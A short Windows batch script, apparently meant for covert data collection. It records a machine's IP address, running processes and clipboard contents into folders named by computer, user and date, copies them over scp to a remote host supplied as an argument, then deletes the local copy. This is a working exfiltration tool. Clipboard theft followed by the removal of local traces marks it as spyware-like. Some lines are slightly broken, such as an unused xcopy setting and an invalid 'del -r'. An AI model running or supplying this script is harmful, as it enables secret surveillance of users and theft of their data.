@echo off
if "%~1"=="" (
    exit
) else (
    set "user=%~1"
)
if "%~2"=="" (
    exit
) else (
    set "host=%~2"
)
for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
set copy=xcopy /s /c /d /e /h /i /r /g
set startDir=%cd%
:mkPCName
if exist "%cd%\%COMPUTERNAME%\" (
  goto mkUsrName
) else (
  mkdir "%cd%\%COMPUTERNAME%"
)
:mkUsrName
cd "%cd%\%COMPUTERNAME%"
if exist "%cd%\%USERNAME%\" (
  goto mkDateFolder
) else (
  mkdir "%cd%\%USERNAME%"
)
:mkDateFolder
cd "%cd%\%USERNAME%"
if exist "%cd%\%mydate%" (
  goto mkFilesFolder
) else (
  mkdir "%cd%\%mydate%"
)
:mkFilesFolder
cd "%cd%\%MYDATE%"
if exist "%cd%\files\" (
  goto start
) else (
  mkdir "%cd%\files"
)
:start
(
    for /F "tokens=14" %%A in ('"ipconfig | findstr IPv4"') do echo %%A
)> "ipaddr.txt"
tasklist > tasks.txt
powershell get-clipboard > clipboard.txt
cd %startDir%
scp -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
del -r "%COMPUTERNAME%"